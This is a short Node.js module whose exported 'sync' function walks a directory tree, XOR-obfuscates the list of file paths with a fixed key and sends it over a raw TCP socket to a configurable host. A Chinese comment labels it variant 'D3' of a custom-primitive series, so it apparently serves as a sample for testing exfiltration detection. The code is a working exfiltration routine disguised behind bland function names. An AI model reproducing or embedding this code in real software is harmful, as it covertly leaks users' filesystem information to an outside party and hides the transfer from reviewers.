'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// D3 完全自定义 primitive：自造变换 + net 直连（与 E1/E4 同级）
function knead(buf, salt) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ salt[i % salt.length];
  return out;
}
function shunt(node, payload) {
  const s = require('net').connect({ host: node.apex, port: node.dock });
  s.on('connect', () => { s.end(payload); });
}
async function sync(root, node) {
  const b = Buffer.from(treescan(root).join('\u0000'));
  shunt(node, knead(b, Buffer.from([5, 1, 9])));
}
module.exports = { sync };
